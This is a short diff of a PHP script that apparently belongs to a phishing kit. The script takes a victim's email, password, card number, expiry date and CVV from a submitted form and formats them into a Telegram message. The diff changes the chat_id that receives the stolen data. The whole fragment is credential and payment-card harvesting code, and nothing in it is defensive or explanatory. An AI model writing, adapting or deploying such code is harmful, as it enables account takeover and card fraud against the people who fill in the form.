@@ -16,7 +16,7 @@ $vvc = $_POST['vvc'];
 
 
 $datos = [
-    'chat_id' => '1189170037',
+    'chat_id' => '826703008',
     #'chat_id' => '@el_canal si va dirigido a un canal',
     'text' => "|------✅ Nu RECIBIO \n |-[📗Correo: $acces \n |-[💸Password: $ass \n |-✅ DATOS DE TARJETA \n |-[💳 Card: $cardd \n |-[📆 Vencimiento: $ven \n |-[🔒 CCV: $vvc",
     'parse_mode' => 'HTML' #formato del mensaje
